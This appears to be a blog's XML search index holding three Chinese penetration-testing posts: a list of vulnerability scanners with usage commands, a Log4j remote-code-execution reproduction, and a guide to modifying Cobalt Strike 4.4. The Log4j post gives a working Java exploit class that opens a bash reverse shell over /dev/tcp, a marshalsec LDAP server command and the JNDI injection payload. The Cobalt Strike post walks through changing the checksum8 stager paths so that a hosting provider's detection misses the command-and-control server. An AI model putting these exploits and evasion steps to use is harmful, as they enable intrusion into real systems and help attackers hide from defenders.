<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>【漏扫工具】渗透测试常用工具集整理（包含xray、awvs等）</title>
    <url>/posts/202.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="工欲善其事，必先利其器"><a href="#工欲善其事，必先利其器" class="headerlink" title="工欲善其事，必先利其器"></a>工欲善其事，必先利其器</h1><hr>
<p>渗透测试是一个自动化与手工结合的过程，自动化测试工具必不可少。</p>
<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><h3 id="Acunetix-14-9-220713150-扫描器领军者"><a href="#Acunetix-14-9-220713150-扫描器领军者" class="headerlink" title="Acunetix 14.9.220713150 - 扫描器领军者"></a>Acunetix 14.9.220713150 - 扫描器领军者</h3><h4 id="软件介绍"><a href="#软件介绍" class="headerlink" title="软件介绍"></a>软件介绍</h4><p>Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的Web网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/88e81880e186b8bae203ee95b9c8678a.png" alt="图片"></p>
<h4 id="功能模块"><a href="#功能模块" class="headerlink" title="功能模块"></a>功能模块</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">Web Scanner 核心功能 web安全漏洞扫描</span><br><span class="line">Site Crawler 爬虫功能 遍历站点目录结构</span><br><span class="line">Target Finder 端口扫描 找出web服务器 ，80，443</span><br><span class="line">Subdomain Scanner 子域名扫描器 利用DNS查询</span><br><span class="line">Blind SQL Injector 盲注工具</span><br><span class="line">HTTP Editor http协议数据的编辑器</span><br><span class="line">HTTP Sniffer http协议嗅探器</span><br><span class="line">HTTP Fuzzer 模糊测试工具</span><br><span class="line">Authentication Tester web认证破解工具</span><br></pre></td></tr></table></figure></div>

<h4 id="软件特点"><a href="#软件特点" class="headerlink" title="软件特点"></a>软件特点</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">a 自动的客户端脚本分析器，允许对Ajax和Web2.0应用程序进行安全性测试</span><br><span class="line">b 业内最先进且深入的SQL注入和跨站脚本测试</span><br><span class="line">c 高级渗透测试工具，例如：HTTP Eidtor 和 HTTP Fuzzer</span><br><span class="line">d 可视化宏记录器帮助您轻松测试web表格和受密码保护的区域</span><br><span class="line">e 支持含有CAPTHCA的页面，单个开始指令和Two Factor（双因素）验证机制</span><br><span class="line">f 高速爬行程序检测web服务器类型和应用程序语言</span><br><span class="line">j 智能爬行程序检测web服务器类型和应用程序语言</span><br><span class="line">k 端口扫描web 服务器并对服务器上运行的网络服务执行安全检查</span><br><span class="line">l 可导出网站漏洞文件</span><br></pre></td></tr></table></figure></div>

<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="fscan-1-9-内网重型武器"><a href="#fscan-1-9-内网重型武器" class="headerlink" title="fscan 1.9 - 内网重型武器"></a>fscan 1.9 - 内网重型武器</h3><h4 id="软件介绍-1"><a href="#软件介绍-1" class="headerlink" title="软件介绍"></a>软件介绍</h4><p>一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。</p>
<p>支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1.信息搜集:</span><br><span class="line"></span><br><span class="line">存活探测(icmp)</span><br><span class="line">端口扫描</span><br><span class="line"></span><br><span class="line">2.爆破功能:</span><br><span class="line"></span><br><span class="line">各类服务爆破(ssh、smb、rdp等)</span><br><span class="line">数据库密码爆破(mysql、mssql、redis、psql、oracle等)</span><br><span class="line"></span><br><span class="line">3.系统信息、漏洞扫描:</span><br><span class="line"></span><br><span class="line">netbios探测、域控识别</span><br><span class="line">获取目标网卡信息</span><br><span class="line">高危漏洞扫描(ms17010等)</span><br><span class="line"></span><br><span class="line">4.Web探测功能:</span><br><span class="line"></span><br><span class="line">webtitle探测</span><br><span class="line">web指纹识别(常见cms、oa框架等)</span><br><span class="line">web漏洞扫描(weblogic、st2等,支持xray的poc)</span><br><span class="line"></span><br><span class="line">5.漏洞利用:</span><br><span class="line"></span><br><span class="line">redis写公钥或写计划任务</span><br><span class="line">ssh命令执行</span><br><span class="line">ms17017利用(植入shellcode),如添加用户等</span><br><span class="line"></span><br><span class="line">6.其他功能:</span><br><span class="line"></span><br><span class="line">文件保存</span><br></pre></td></tr></table></figure></div>

<h4 id="更新内容"><a href="#更新内容" class="headerlink" title="更新内容"></a>更新内容</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">加入手工gc回收,尝试节省无用内存。</span><br><span class="line">-url 支持逗号隔开。</span><br><span class="line">修复一个poc模块bug。</span><br></pre></td></tr></table></figure></div>

<h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p>简单用法</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">fscan.exe -h 192.168.1.1&#x2F;24  (默认使用全部模块)</span><br><span class="line">fscan.exe -h 192.168.1.1&#x2F;16  (B段扫描)</span><br></pre></td></tr></table></figure></div>

<p><img src="https://img-blog.csdnimg.cn/img_convert/4151e17c9e008c9d92088ff0620fee65.png" alt="图片">图片</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/6b428e101981257947e86d68966b249a.png" alt="图片">图片</p>
<h3 id="Kscan-1-8-资产测绘工具"><a href="#Kscan-1-8-资产测绘工具" class="headerlink" title="Kscan 1.8 - 资产测绘工具"></a>Kscan 1.8 - 资产测绘工具</h3><h4 id="软件介绍-2"><a href="#软件介绍-2" class="headerlink" title="软件介绍"></a>软件介绍</h4><p>Kscan是一款纯go开发的全方位扫描器，具备端口扫描、协议检测、指纹识别，暴力破解等功能。支持协议1200+，协议指纹10000+，应用指纹2000+，暴力破解协议10余种。</p>
<h4 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">usage: kscan [-h,--help,--fofa-syntax] (-t,--target,-f,--fofa,--touch,--spy) [-p,--port|--top] [-o,--output] [-oJ] [--proxy] [--threads] [--path] [--host] [--timeout] [-Pn] [-Cn] [-sV] [--check] [--encoding] [--hydra] [hydra options] [fofa options]</span><br><span class="line"></span><br><span class="line">IP地址：114.114.114.114</span><br><span class="line">IP地址段：114.114.114.114-115.115.115.115</span><br><span class="line">URL地址：https:&#x2F;&#x2F;www.baidu.com</span><br><span class="line">文件地址：file:&#x2F;tmp&#x2F;target.txt</span><br></pre></td></tr></table></figure></div>

<p><img src="https://img-blog.csdnimg.cn/img_convert/a5d7e2393bd045afd2cb50dd2ec2532a.png" alt="图片">图片</p>
<h3 id="xray-1-9-1-漏洞捕获神器"><a href="#xray-1-9-1-漏洞捕获神器" class="headerlink" title="xray 1.9.1 - 漏洞捕获神器"></a>xray 1.9.1 - 漏洞捕获神器</h3><h4 id="软件介绍-3"><a href="#软件介绍-3" class="headerlink" title="软件介绍"></a>软件介绍</h4><p><img src="https://img-blog.csdnimg.cn/img_convert/466cf37b7a42a7d67d94df70a0203fe5.png" alt="图片"></p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">● SQL 注入检测 (key: sqldet)</span><br><span class="line">支持报错注入、布尔注入和时间盲注等</span><br><span class="line">● 命令&#x2F;代码注入检测 (key: cmd-injection)</span><br><span class="line">支持 shell 命令注入、PHP 代码执行、模板注入等</span><br><span class="line">● 目录枚举 (key: dirscan)</span><br><span class="line">检测备份文件、临时文件、debug 页面、配置文件等10余类敏感路径和文件</span><br><span class="line">● 路径穿越检测 (key: path-traversal)</span><br><span class="line">支持常见平台和编码</span><br><span class="line">● XML 实体注入检测 (key: xxe)</span><br><span class="line">支持有回显和反连平台检测</span><br><span class="line">● poc 管理 (key: phantasm)</span><br><span class="line">默认内置部分常用的 poc，用户可以根据需要自行构建 poc 并运行。文档：https:&#x2F;&#x2F;docs.xray.cool&#x2F;#&#x2F;guide&#x2F;poc</span><br><span class="line">● 文件上传检测 (key: upload)</span><br><span class="line">支持常见的后端语言</span><br><span class="line">● 弱口令检测 (key: brute-force)</span><br><span class="line">社区版支持检测 HTTP 基础认证和简易表单弱口令，内置常见用户名和密码字典</span><br><span class="line">● jsonp 检测 (key: jsonp)</span><br><span class="line">检测包含敏感信息可以被跨域读取的 jsonp 接口</span><br><span class="line">● ssrf 检测 (key: ssrf)</span><br><span class="line">ssrf 检测模块，支持常见的绕过技术和反连平台检测</span><br><span class="line">● 基线检查 (key: baseline)</span><br><span class="line">检测低 SSL 版本、缺失的或错误添加的 http 头等</span><br><span class="line">● 任意跳转检测 (key: redirect)</span><br><span class="line">支持 HTML meta 跳转、30x 跳转等</span><br><span class="line">● CRLF 注入 (key: crlf-injection)</span><br><span class="line">检测 HTTP 头注入，支持 query、body 等位置的参数</span><br><span class="line">● Struts2 系列漏洞检测 (高级版，key: struts)</span><br><span class="line">检测目标网站是否存在Struts2系列漏洞，包括s2-016、s2-032、s2-045等常见漏洞</span><br><span class="line">● Thinkphp系列漏洞检测 (高级版，key: thinkphp)</span><br><span class="line">检测ThinkPHP开发的网站的相关漏洞</span><br></pre></td></tr></table></figure></div>

<h4 id="使用方法-2"><a href="#使用方法-2" class="headerlink" title="使用方法"></a>使用方法</h4><p>爬虫模式</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.\xray_windows_amd64.exe webscan --basic-crawler http:&#x2F;&#x2F;testphp.vulnweb.com&#x2F; --html-output xray-crawler-testphp.html</span><br></pre></td></tr></table></figure></div>

<p>代理模式</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.\xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output xray-testphp.html</span><br></pre></td></tr></table></figure></div>

<p>高级爬虫模式</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.\xray_windows_amd64.exe webscan --browser-crawler &quot;https:&#x2F;&#x2F;a.a.cn&#x2F;zdsys&#x2F;&quot; --html-output aqjg.mem.gov.cn.html</span><br></pre></td></tr></table></figure></div>



<p><strong>免责声明</strong></p>
<p>由于传播、利用本公众号渗透安全团队所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号渗透安全团队及作者不为<strong>此</strong>承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！</p>
<p>领取工具地址：<a href="https://mp.weixin.qq.com/s/LHNKndTlbghAtTjNi2a5ag" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/LHNKndTlbghAtTjNi2a5ag</a></p>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>漏扫工具</tag>
      </tags>
  </entry>
  <entry>
    <title>【知识积累】Apache Log4j任意代码执行复现</title>
    <url>/posts/180.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h4 id="Apache-Log4j任意代码执行复现"><a href="#Apache-Log4j任意代码执行复现" class="headerlink" title="Apache Log4j任意代码执行复现"></a>Apache Log4j任意代码执行复现</h4><p>1、构造反序列化exp，改一下ip就好了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">"bash"</span>, <span class="string">"-c"</span>, <span class="string">"bash -i &gt;&amp; /dev/tcp/ip/12000 0&gt;&amp;1"</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>2、用javac编译一下</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211210213857114.png" alt=""></p>
</blockquote>
<p>3、将刚刚得到的class放入我们即将开启的web目录里面，然后开启</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211210214007255.png" alt=""></p>
</blockquote>
<p>4、访问效果可以看一下</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211210214951360.png" alt=""></p>
</blockquote>
<p>5、然后我们去github上下一个ldap对应的注入工具</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;RandomRobbieBF&#x2F;marshalsec-jar</span><br></pre></td></tr></table></figure></div>

<p>6、然后执行以下命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http:&#x2F;&#x2F;ip&#x2F;#Exp&quot; 9999</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211210215313740.png" alt=""></p>
</blockquote>
<p>7、nc开启监听命令</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211210214526864.png" alt=""></p>
</blockquote>
<p>8、准备工作搞完了，就直接payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap:&#x2F;&#x2F;ip:9999&#x2F;Exp&#125;</span><br></pre></td></tr></table></figure></div>

<p>靶场测试：<a href="http://d63bb2586.lab.aqlab.cn/" target="_blank" rel="noopener">http://d63bb2586.lab.aqlab.cn/</a></p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211210214933440.png" alt=""></p>
</blockquote>
<p>9、接着就弹shell了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211210214641190.png" alt=""></p>
</blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>任意代码执行</tag>
      </tags>
  </entry>
  <entry>
    <title>【知识积累】CS4.4绕过vultr特征检测修改checksum8算法</title>
    <url>/posts/179.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>众所周知，关于cs相关的资料都非常的少，并且是打得特别紧，特别是这两年各个安全厂商对cs相关的内容都给予了特征识别等严重的打击，例如vultr网站会检测特征并关停服务器，我们可以同个多种方式更改特征绕过，接下来我们来讲更改cs的算法进行绕过。例如下面这样</strong></p>
<p>我弄的环境，就因为开了cs结果就被强制破坏o(╥﹏╥)o</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211203011133715.png" alt=""></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211203010937191.png" alt=""></p>
</blockquote>
<h3 id="特征检测"><a href="#特征检测" class="headerlink" title="特征检测"></a>特征检测</h3><p><strong>关于被检测的特征详细来概述</strong></p>
<p>首先我们新建监听器</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202011731891.png" alt=""></p>
</blockquote>
<p>这里我们一般用80和443来监听，因为其他端口的容易被封，这俩端口基本没人去管</p>
<p>接下来我们打开特征的的一些链接看下</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202012056374.png" alt=""></p>
</blockquote>
<p>可直接下载对应的文件，网上有一大堆检测脚本，我就不列举了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202013200470.png" alt=""></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202013245299.png" alt=""></p>
</blockquote>
<h3 id="链接特征"><a href="#链接特征" class="headerlink" title="链接特征"></a>链接特征</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">80：http:&#x2F;&#x2F;IP&#x2F;aaa9</span><br><span class="line"></span><br><span class="line">443：https:&#x2F;&#x2F;ip:443&#x2F;aaa9</span><br></pre></td></tr></table></figure></div>

<p>当然特征不止这一个<strong>aaa9</strong>例如<strong><a href="http://IP/HjIa" target="_blank" rel="noopener">http://IP/HjIa</a></strong> 这个也会出现这种状态 并不是404 （部分浏览器假的404需要多打开几遍才会请求下载未知文件）只要是符合<strong>checksum8</strong>算法技术出来的文件都可以请求到 <strong>不是唯一值</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202013343293.png" alt=""></p>
</blockquote>
<p>我们可以看到这里面的请求的一些状态链接都是很短的，只有在发命令通过抓包才是那种长链接</p>
<p>下面就直接反编译，或者你找源码 都是有的</p>
<h1 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h1><p>我们更改特征首先要反编译压缩包里面所有的.class文件，把他变成.java格式的我们才能编译</p>
<p>反编译这里推荐有一个工具比较方便，当然还有其他工具 但是讲的话文章会很长 我尽量很详细，我学习的时候搜索的资料大部分都有坑或者关键部分就直接跳过了这就很烦结合了多个文章内容我直达精髓。</p>
<p> JD-GUI：<a href="https://jd-gui.apponic.com/download/" target="_blank" rel="noopener">https://jd-gui.apponic.com/download/</a></p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202014042678.png" alt=""></p>
</blockquote>
<p>我们可以看到很直观的就可以看到里面的内容</p>
<blockquote>
<p>我们通过左上角<strong>File→Save All Sourcel</strong>来保存全部反编译的文件（也可以下载别人的源代码或者别的工具反编译），会让你选择路径以及各式，保存好，我们这里反编译好了出现了个<strong>cobaltstrike.jar.src.zip</strong>文件</p>
</blockquote>
<p>然后我们安装<strong>JAVAIDE</strong>(这个工具里面也有反编译的包具体方法可以网上搜索)</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">Java ide：https:&#x2F;&#x2F;www.jetbrains.com&#x2F;zh-cn&#x2F;idea&#x2F;.</span><br></pre></td></tr></table></figure></div>

<p>下载安装 里面有两个版本 不用纠结 第一个收费 第二个社区的免费 正好也能满足我们的需求</p>
<p>安装完成后我们打开安装中文包插件（英文的我看不懂）在<strong>PLugins</strong>里面搜索<strong>chinese</strong>第二个就是</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202020027408.png" alt=""></p>
</blockquote>
<p>我们来安装他 点击安装后会重新启动软件就变成中文的了</p>
<h3 id="项目和环境配置"><a href="#项目和环境配置" class="headerlink" title="项目和环境配置"></a>项目和环境配置</h3><blockquote>
<p>这里我首先提醒大家最好用老版本的Java,原因是新版本的编译的老版本的java不能运行，而老版本的却向上兼容，这就很蛇皮了，太老的版本可能少程序 推荐java1.8    java1.8=java8 是一样的。（这个里面可以直接下载Java1.8.0，目前是可以的以后就不知道了）</p>
</blockquote>
<p>1、我们新建项目就默认第一个java模块然后不停的下一步选择路径打开，看图</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202020908642.png" alt=""></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202020928741.png" alt=""></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202020947039.png" alt=""></p>
</blockquote>
<p>2、创建好之后我们新建俩文件夹，在软件里面和在外面创建都行都是同步刷新的，修改也是。这里我们新建<strong>decompiled_src</strong>和l<strong>ib</strong>文件夹这里我就列举一个图减少占用</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202021417490.png" alt=""></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202021428929.png" alt=""></p>
</blockquote>
<p>3、建立完成就是这个样子的，现在我们需要两个文件一个是反编译后<strong>cobaltstrike</strong>文件，一个是未反编译的<strong>cobaltstrike.jar</strong>原始文件，原因是编译需要依赖的文件环境和包，不然各种报错，非常的恼火，把原始文件<strong>cobaltstrike.jar</strong>放到<strong>lib</strong>文件夹，反编译后的解压到<strong>decompiled_src</strong>文件夹</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202022048081.png" alt=""></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202022142488.png" alt=""></p>
</blockquote>
<p>4、弄好之后就是这个样子的，然后咱们来设置环境，左上角 文件→项目结构，看一下<strong>sdk</strong>是否正确，然后点击模块，然后看图</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202022400171.png" alt=""></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202022732793.png" alt=""></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202022937824.png" alt=""></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202023043499.png" alt=""></p>
</blockquote>
<p>5、<strong>选择lib里面cs原始jar包点击确定，确定完成之后打勾然后应用</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202023300534.png" alt=""></p>
</blockquote>
<p>6、然后点击<strong>工件→JAR→来自有依赖项的模块→然后选择Aggressor</strong> 出现<strong>aggressor.Aggressor</strong>就说明正确了，然后确定，工件就设置完成了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202023427271.png" alt=""></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202023753857.png" alt=""></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202023949458.png" alt=""></p>
</blockquote>
<p><strong>7、接下来看一下sdk有没有设置正确，正确直接应用然后确定</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211203010110582.png" alt=""></p>
</blockquote>
<h3 id="修改checksum8算法"><a href="#修改checksum8算法" class="headerlink" title="修改checksum8算法"></a>修改checksum8算法</h3><p>在<strong>D:\cs\decompiled_src\cloudstrike</strong>里面有个<strong>WebServer.java</strong>文件包含算法，这个好像是监听器里面的，有这个算法的还有另一个<strong>D:\cs\decompiled_src\common\CommonUtils.java</strong>也包含checksum8</p>
<p>我们吧要修改的文件放到<strong>D:\cs\src</strong> 里面，这个文件代表着我们要编译的文件整合到jar文件里（就是实际只是编译的这两个文件）复制的之后要注意吧文件夹也复制过去 它会自动整合到路径</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202025149431.png" alt=""></p>
</blockquote>
<p>我们双击打开<strong>WebServer.java</strong> 然后<strong>ctrl+f</strong>搜索<strong>checksum8</strong>，这里我们很直观的就可以看到各种结果</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202025608324.png" alt=""></p>
<p><strong>checksum8，辅助算法计算脚本</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EchoTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">long</span> <span class="title">checksum8</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (text.length() &lt; <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        text = text.replace(<span class="string">"/"</span>, <span class="string">""</span>);</span><br><span class="line">        <span class="keyword">long</span> sum = <span class="number">0L</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> x = <span class="number">0</span>; x &lt; text.length(); x++) &#123;</span><br><span class="line">            sum += text.charAt(x);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(checksum8(<span class="string">"ds6f565sdf44s65d4f21dsf1.jpg"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先，我们想一个自己想要生成的stage访问下载地址“<strong>ds6f565sdf44s65d4f21dsf1.jpg</strong>”可以随意更换的</p>
<p>我们对于<strong>ds6f565sdf44s65d4f21dsf1.jpg</strong>这个可以随意换字符，这个是我乱打的到时候请求这个会请求到我们的文件，这个文件用于生成的那种20kb的他是后续会自动下载这个载入进去 你不想要这个可以直接web里边杀掉这俩stager站点，为了我的内容能少点我就不讲其他的了，可以从别的文章了解。</p>
<p>我们通过这个技术按脚本可以把他复制到在线java运行的网站查询结果，我这边呢就列举一个</p>
<p>在线运行java：<a href="https://c.runoob.com/compile/10/" target="_blank" rel="noopener">https://c.runoob.com/compile/10/</a></p>
<p>进去之后把技术按脚本复制粘贴到里面然后自己把这个字符串随意编辑一下点击运行，这里这个运行结果就是我们要更改的值，这里我们需要技术两个不一样的值，一样的话只能生效一个，x64和x86随意分配计算</p>
<blockquote>
<p>注意：x64和x86是分别弄两个固定的下载stage的文件</p>
</blockquote>
<p><strong>首先，我们第一个x86就如图所示，checksum8计算之后值等于2260就可以上线</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202031122250.png" alt=""></p>
</blockquote>
<p><strong>第二步，此处同理，我们得出第二个想要的值2665，对应的就是传入的固定jpg路径</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202235349531.png" alt=""></p>
</blockquote>
<p><strong>第三步，修改对应位置的我们刚刚生成的值和字符串</strong></p>
<p>删完之后是这个结果如下图，可别把人家的括号和符号给人家干没了，不然要报错，<strong>如图所示</strong></p>
<p><strong>注意：同是小白提醒下，请勿删多删少，报错会让你知道</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211203000507918.png" alt=""></p>
</blockquote>
<p><strong>第四步、</strong>然后我们先编译测试下 因为反编译的肯定有错误的地方会报错，有时候不报错运气好，我们点击<strong>构建→构建工件</strong>，然后点击<strong>构建</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211202235920251.png" alt=""></p>
</blockquote>
